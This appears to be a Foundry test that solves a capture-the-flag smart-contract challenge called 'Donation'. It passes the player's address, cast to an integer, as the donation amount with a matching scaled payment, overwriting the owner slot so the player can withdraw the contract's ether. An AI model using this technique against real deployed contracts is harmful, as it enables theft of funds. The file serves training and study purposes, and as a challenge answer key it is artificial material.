// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

interface IDonation {
    function donate(uint256 etherAmount) external payable;
    function withdraw() external;
    function isComplete() external view returns (bool);
}

contract Challenge5Test is Test {
    IDonation target;
    address player = vm.addr(1);

    function setUp() public {
        address deployment = deployCode("5-Donation.sol:DonationChallenge", 1 ether);
        target = IDonation(deployment);
        vm.label(address(target), "Challenge");
        vm.label(player, "Player");
        vm.deal(player, 1 ether);
    }

    function testComplete() external {
        vm.startPrank(player);

        uint256 scale = 10**18 * 1 ether;
        uint256 addressUint = uint256(uint160(player));

        target.donate{value: addressUint / scale}(addressUint);
        target.withdraw();

        assertTrue(target.isComplete(), "Challenge should be complete");
    }
}